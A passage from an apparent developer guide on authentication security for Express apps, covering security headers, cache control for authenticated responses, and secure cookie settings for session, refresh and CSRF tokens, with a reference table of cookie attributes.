  // Prevent MIME sniffing
  noSniff: true,
  // Referrer policy — limit referrer info leakage
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  // Permissions policy
  permittedCrossDomainPolicies: { permittedPolicies: 'none' },
}));

// Additional auth-specific headers
app.use((req, res, next) => {
  // Prevent caching of authenticated responses
  if (req.user) {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.set('Pragma', 'no-cache');
  }
  next();
});
```

CSP is the most impactful header for auth security — it prevents XSS attacks that could steal tokens. `no-store` on authenticated responses prevents cached data from being served to different users on shared computers. HSTS ensures the browser always uses HTTPS, preventing cookie theft via downgrade attacks.

Complete reference for cookie security attributes and their auth implications.

```typescript
// Maximum security — auth session cookie
res.cookie('session', sessionToken, {
  httpOnly: true,     // Not accessible via document.cookie
  secure: true,       // HTTPS only (set false for localhost)
  sameSite: 'strict', // Never sent cross-origin
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in ms
  path: '/',          // Available on all routes
  domain: '.myapp.com', // Shared across subdomains
  // signed: true,    // If using cookie-parser with secret
});

// Refresh token — restricted path
res.cookie('refresh_token', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
  path: '/api/auth/refresh', // ONLY sent to refresh endpoint
});

// CSRF token — must be readable by JS
res.cookie('csrf_token', csrfToken, {
  httpOnly: false,    // JS must read this!
  secure: true,
  sameSite: 'strict',
  maxAge: 60 * 60 * 1000, // 1 hour
});
```

| Attribute | Purpose | Auth Impact |
|-----------|---------|-------------|
| httpOnly | Blocks JS access | Prevents XSS token theft |
| secure | HTTPS only | Prevents man-in-the-middle |
| sameSite=strict | No cross-origin | Full CSRF protection |
| sameSite=lax | Cross-origin GET ok | CSRF protection for mutations |
| sameSite=none | Cross-origin ok | Need CSRF tokens! |
| path | Restrict to URL path | Minimize token exposure |
| domain | Subdomain sharing | Use for SSO across subdomains |
| maxAge/expires | Lifetime | Session vs persistent cookies |

Omitting `maxAge` and `expires` creates a session cookie that's deleted when the browser closes. Use `sameSite: 'strict'` for auth cookies (breaks OAuth redirects) or `'lax'` (allows top-level GET navigations).
